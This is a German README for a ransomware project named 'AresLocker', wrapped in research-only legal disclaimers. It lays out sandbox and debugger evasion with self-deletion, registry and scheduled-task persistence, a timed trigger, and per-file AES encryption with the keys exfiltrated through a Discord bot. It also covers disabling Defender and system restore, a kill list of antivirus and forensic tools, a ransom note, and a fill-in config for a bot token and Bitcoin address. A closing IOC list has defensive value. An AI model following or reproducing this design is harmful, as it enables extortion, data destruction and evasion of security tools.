
# Wichtiger rechtlicher Hinweis

**Dieses Projekt dient ausschließlich Forschungs-, Analyse- und Testzwecken im Bereich der IT-Sicherheit. Jegliche Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche und schriftliche Erlaubnis ist strengstens untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen. Die Verantwortung für die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer.**

**Verwenden Sie dieses Projekt niemals auf produktiven Systemen oder außerhalb von kontrollierten, legalen Testumgebungen. Mit der Nutzung bestätigen Sie, dass Sie sich der rechtlichen Risiken bewusst sind und sämtliche Konsequenzen selbst tragen.**

# Nutzungsbedingungen

1. **Zweck:** Dieses Projekt ist ausschließlich für legale Forschungs-, Analyse- und Testzwecke im Bereich der IT-Sicherheit bestimmt.
2. **Verbotene Nutzung:** Jegliche Anwendung, Verbreitung oder Nutzung auf fremden Systemen ohne ausdrückliche, schriftliche Erlaubnis des Eigentümers ist untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen.
3. **Haftungsausschluss:** Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen.
4. **Eigenverantwortung:** Die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer. Der Nutzer trägt sämtliche rechtlichen Konsequenzen selbst.
5. **Keine Produktivnutzung:** Die Nutzung auf produktiven Systemen oder außerhalb von kontrollierten, legalen Testumgebungen ist strengstens untersagt.
6. **Änderungen:** Der Autor behält sich vor, die Nutzungsbedingungen jederzeit zu ändern. Es gilt die jeweils aktuelle Fassung in diesem Dokument.
7. **Hinweis:** Mit der Nutzung dieses Projekts erkennen Sie diese Bedingungen ausdrücklich an.


# AresLocker – Technische Übersicht


## Funktionsübersicht

### 1. Start & Initialisierung
Das Programm wird mit `run.py` gestartet und prüft:
- Python-Version (>= 3.8)
- Erforderliche Module (z.B. cryptography, discord.py)
- Administratorrechte (`ctypes.windll.shell32.IsUserAnAdmin()`)

Sicherheitsmaßnahmen:
- Mutex `Global\\AresLocker` verhindert Mehrfachausführung
- Logging mit rotierenden Dateien
- Prozessname wird verschleiert

### 2. Analysephase (Sandbox-/VM-Erkennung)
Mechanismen zur Erkennung von Analyseumgebungen:
- **Hardware:** VM-MAC-Präfixe, CPUID, RAM-/HDD-Größe
- **Software:** Bekannte Tools im Speicher, Debugger (`IsDebuggerPresent()`), Registry-Keys von VMs
- **Netzwerk:** DNS bekannter Sandbox-Dienste, Latenztests

**Bei Analyseerkennung:**
- Sofortige Selbstlöschung (`dell.bat`), Secure-Wipe temporärer Dateien, Registry-Bereinigung

**Bei unauffälliger Umgebung:**
- Entpacken verschlüsselter Archive (7zip)
- Start der Persistenzmechanismen
- Hauptfunktionen werden initialisiert

### 3. Persistenz
Mehrere Methoden sorgen für Autostart und Selbstheilung:
- Batch: `run.bat` (Autostart, Registry, geplante Tasks)
- Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Geplante Tasks (`schtasks`)
- Kopie ins Autostart-Verzeichnis
- Optional: Manipulation von Diensten/Scheduled Tasks
- Regelmäßige Überprüfung und Wiederherstellung der Persistenz

### 4. Terminüberwachung
Zeitgesteuerter Ablauf über `trigger.bat`:
- Überwachung eines vordefinierten Zeitpunkts (lokal oder via Zeitserver)
- Verzögerung zur Erschwerung der Analyse möglich
- Bei Erreichen des Zeitpunkts:
  - Start der Hauptfunktion (`main.py`): Dateiverschlüsselung, Anzeige der Lösegeldforderung
  - Deaktivierung von Schutzmechanismen (`disalbe.py`): Registry, Dienste, Prozesse
  - Optional: Manipulation der Hosts-Datei

### 5. Hauptfunktion: Dateiverschlüsselung & Schlüsselmanagement
- Systemweite Dateisuche (Ausschluss von Systemverzeichnissen und bestimmten Dateitypen)
- Für jede Datei: Generierung eines individuellen AES-256-Schlüssels (AES-GCM, IV pro Datei)
- AES-Schlüssel wird **nicht lokal gespeichert**, sondern mit ECIES (SECP256K1, Public Key aus `public.pem`) verschlüsselt
- Schlüssel und Metadaten werden **asynchron per Discord-Bot** an einen Channel gesendet (`key.bin`/`key_<hash>.bin`)
- Nach erfolgreicher Verschlüsselung: Originaldatei löschen, Integrität per SHA256-Hash prüfen
- Schlüsselmanagement im RAM (sichere Löschung nach Gebrauch)
- Erstellung und Platzierung der Lösegeldforderung (`note.py`)
- Optional: Verschlüsselung von Netzwerkfreigaben und Beenden bestimmter Prozesse

#### Ablaufdiagramm (vereinfacht)
1. Start (`run.py`): Initialisierung, Rechteprüfung, Logging
2. Analysephase → ggf. Selbstlöschung (`dell.bat`)
3. Extraktion & Persistenz (`extract.bat`, `run.bat`)
4. Terminüberwachung (`trigger.bat`)
5. Hauptfunktion: Verschlüsselung & Anzeige der Lösegeldforderung (`main.py`, `encryptor.py`, `note.py`)
   - Schutzmechanismen deaktivieren (`disalbe.py`)
   - Systemwiederherstellung verhindern
   - Netzwerkfreigaben und externe Laufwerke optional einbeziehen

#### Hinweise zur Konfiguration
Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Klasse `Config` vorgenommen. Wichtige Parameter sind u.a.:
- Bitcoin-Adresse, Kontakt-E-Mail, Countdown, Timer-Datei
- Discord-Bot-Token, Channel-ID, Schlüsseldateiname
- Chunk-Größe, Pfade, Logdatei, Dateiendung
- Upload-Retries, Ausschlussverzeichnisse




## Datei- und Verzeichnisstruktur

- `AresLocker/encryptor/arciv/`: Hauptskripte und Batch-Dateien
- `AresLocker/encryptor/`: Weitere Komponenten (z.B. 7z.exe, extract.bat)
- `AresLocker/keys/`: Schlüsseldateien (`private.pem`, `public.pem`)
- `AresLocker/decryptor/`: Tools zur Entschlüsselung (bei vorhandenem Private Key)

**Wichtige Dateien:**
- `start.py`: Initialisierung, Rechteprüfung, Logging
- `extract.bat`: Entpacken, AV-Umgehung
- `run.bat`: Persistenz, Autostart
- `trigger.bat`: Zeitüberwachung
- `main.py`: Steuerung der Hauptfunktion
- `encryptor.py`: Verschlüsselung, Dateisuche, Schlüsselmanagement, Discord-Upload
- `note.py`: Erstellung/Anzeige der Lösegeldforderung
- `disalbe.py`: Deaktivierung von Schutzmechanismen
- `dell.bat`: Selbstlöschung
- `7z.exe`: Entpacken von Archiven
- `dc_extract.py`: (optional)

**Ablaufdiagramm (vereinfacht):**
1. Start (`run.py`): Initialisierung, Rechteprüfung, Logging
2. Analysephase → ggf. Selbstlöschung (`dell.bat`)
3. Extraktion & Persistenz (`extract.bat`, `run.bat`)
4. Terminüberwachung (`trigger.bat`)
5. Hauptfunktion: Verschlüsselung & Anzeige der Lösegeldforderung (`main.py`, `encryptor.py`, `note.py`)
   - Schutzmechanismen deaktivieren (`disalbe.py`)
   - Systemwiederherstellung verhindern
   - Netzwerkfreigaben und externe Laufwerke optional einbeziehen


**Konfigurationen (aktualisiert):**
Alle zentralen Einstellungen werden in `encryptor/arciv/config.py` über die Klasse `Config` vorgenommen. Wichtige Parameter sind:

    # === Werte für die Lösegeldforderung ===
    BTC_ADDRESS = "1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv"  # Bitcoin-Adresse
    CONTACT_EMAIL = "unlock@fakedomain.to"            # Kontakt-E-Mail
    COUNTDOWN_HOURS = 72                               # Countdown in Stunden
    TIMER_FILE = "ransom_timer.txt"                   # Timer-Dateiname

    # === Werte für den Upload des Keys auf Discord ===
    TOKEN = "DEIN_DISCORD_BOT_TOKEN"  # Hier deinen Bot Token eintragen
    CHANNEL_ID = 123456789012345678  # Hier die Ziel-Channel-ID eintragen
    ENCRYPTED_KEY_FILENAME = "key.bin"  # Name der Schlüsseldatei
    # === Werte für die Verschlüsselung ===
    CHUNK_SIZE = 5 * 1024 * 1024                # Größe der Chunks beim Lesen großer Dateien (5 MB)
    ECIES_PUBLIC_KEY_PATH = Path("public.pem")  # Pfad zum öffentlichen ECIES-Schlüssel
    LOG_FILE = Path("encryption.log")         # Logdatei für den Verschlüsselungsprozess
    ENCRYPTED_EXTENSION = ".areslock"         # Dateiendung für verschlüsselte Dateien
    
    # === Discord-Upload Einstellungen ===
    MAX_RETRIES = 3                          # Maximale Anzahl von Upload-Versuchen
    RETRY_DELAY = 2                          # Wartezeit zwischen Upload-Versuchen (Sekunden)

    # === Prozesse die beendet werden sollen ===
    TARGET_PROCESSES = [
        # Systemtools
        "Taskmgr.exe", "ProcessHacker.exe", "procexp.exe", "procexp64.exe", "perfmon.exe",
        "msconfig.exe", "regedit.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
        "wmic.exe", "services.exe", "resmon.exe", "SystemSettings.exe",
        "eventvwr.exe", "gpedit.msc", "mmc.exe", "dxdiag.exe", "verifier.exe",
        "sigverif.exe", "tasklist.exe", "taskkill.exe",

        # Sicherheits-/Antiviren-Tools
        "MsMpEng.exe", "NortonSecurity.exe", "avp.exe", "avgui.exe", "avastui.exe",
        "mcshield.exe", "ashDisp.exe", "bdagent.exe", "f-secure.exe", "savservice.exe",
        "ekrn.exe", "cfp.exe", "zatray.exe", "mbam.exe", "mbamtray.exe", "wrsa.exe",
        "SecHealthUI.exe", "ccSvcHst.exe", "egui.exe", "avguard.exe", "pav.exe",
        "clamscan.exe", "trusteer.exe", "msmpengcp.exe", "sbiectrl.exe", "vsmon.exe",
        "gdscan.exe", "v3svc.exe", "spysweeper.exe", "detectionengine.exe", "hipsservice.exe",
        "cortexagent.exe", "carbonblack.exe",

        # Debugging / Forensik / Analyse
        "windbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe", "ImmunityDebugger.exe",
        "x64dbg.exe", "procmon.exe", "tcpview.exe", "wireshark.exe", "fiddler.exe",
        "dumpcap.exe", "procdump.exe", "autoruns.exe", "accesschk.exe",
        "osqueryd.exe", "velociraptor.exe",

        # Netzwerktools & CLI
        "netstat.exe", "ipconfig.exe", "ping.exe", "tracert.exe",
        "nmap.exe", "curl.exe", "wget.exe"
    ]

    # === Verzeichnisse, die bei der Dateisuche ignoriert werden ===
    EXCLUDED_DIRS = [
        Path('C:\\Windows'),                  # Windows-Systemverzeichnis
        Path('C:\\Program Files'),            # Programme
        Path('C:\\Program Files (x86)'),      # 32-Bit-Programme
        Path('C:\\System Volume Information'),# Systeminformationen
        Path('C:\\$Recycle.Bin'),             # Papierkorb
        Path('C:\\Users\\Default'),           # Default-User
        Path('C:\\Users\\Public'),            # Öffentliche Benutzer
        Path('C:\\ProgramData'),              # Programmdaten
        Path('C:\\Recovery')                  # Recovery-Partition
    ]

    # === Werte für das Hauotprogramm ===
    BITCOIN_URL = "https://www.bitcoin.com"  # Zahlungs-URL
    NOTE_PROCESS_NAME = "note.exe"           # Name der Lösegeldforderung
    NOTE_EXE_PATH = r"note.exe"              # Pfad zu Lösegeldforderung


# Indikatoren einer Kompromittierung (IOCs)

Die folgenden Merkmale können auf eine Infektion mit AresLocker hindeuten:

**Dateinamen und Dateiendungen:**
- Verschlüsselte Dateien mit der Endung `.areslock`
- `key.txt` (verschlüsselter universeller AES-Schlüssel)
- `encryption.log` (Logdatei)
- `ransom_timer.txt` (Timer-Datei)
- `note.exe` (Lösegeldforderung)
- Batch-Dateien: `extract.bat`, `run.bat`, `trigger.bat`, `dell.bat`
- Python-Skripte: `main.py`, `encryptor.py`, `note.py`, `disalbe.py`, `dc_extract.py`
- `7z.exe` (wird zur Extraktion verwendet)

**Verzeichnisse und Pfade:**
- `AresLocker/encryptor/arciv/`, `AresLocker/keys/`, `AresLocker/decryptor/`

**Prozesse:**
- `note.exe`

**Registry-Keys (Persistenz):**
- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`

**Geplante Tasks:**
- Aufgaben, die auf `run.bat` oder `note.exe` verweisen

**Netzwerk:**
- Kommunikation mit Discord (Bot-Token, Channel-ID)
- Optional: Verbindung zu `https://www.bitcoin.com`

**Kontaktinformationen in der Lösegeldforderung:**
- Bitcoin-Adresse: `1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv`
- Kontakt-E-Mail: `unlock@fakedomain.to`

**Weitere Hinweise:**
- Dateien/Prozesse mit den o.g. Namen
- Unerwartete Dateien im Autostart oder geplante Tasks
- Log- oder Schlüsseldateien im Benutzerverzeichnis
- Netzwerkverbindungen zu Discord-IP-Adressen
- Manipulierte Hosts-Datei (z. B. Blockierung von Sicherheitsupdates oder Hilfeseiten)
- Geänderte Registry-Einträge (Task-Manager, Defender, Systemwiederherstellung deaktiviert)
- Geänderte oder neue geplante Tasks mit ungewöhnlichen Triggern
- Temporäre Dateien oder Reste im Benutzerverzeichnis
- Auffällige Logdateien oder Spuren im Windows-Ereignisprotokoll
- Hinweise auf Selbstheilungsmechanismen (z. B. wiederhergestellte Autostart-Einträge)
- Dateien mit der Endung `.areslock` auf Netzlaufwerken oder USB-Geräten

# Rechtlicher Hinweis (erneut)

**Dieses Dokument und alle enthaltenen Informationen dienen ausschließlich Forschungs-, Analyse- und Testzwecken im Bereich der IT-Sicherheit. Jegliche Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche und schriftliche Erlaubnis ist strengstens untersagt und kann straf- sowie zivilrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, Datenverluste oder sonstige Folgen, die durch unsachgemäßen, fahrlässigen oder missbräuchlichen Einsatz entstehen. Die Verantwortung für die Einhaltung aller geltenden Gesetze und Vorschriften liegt ausschließlich beim Nutzer.**
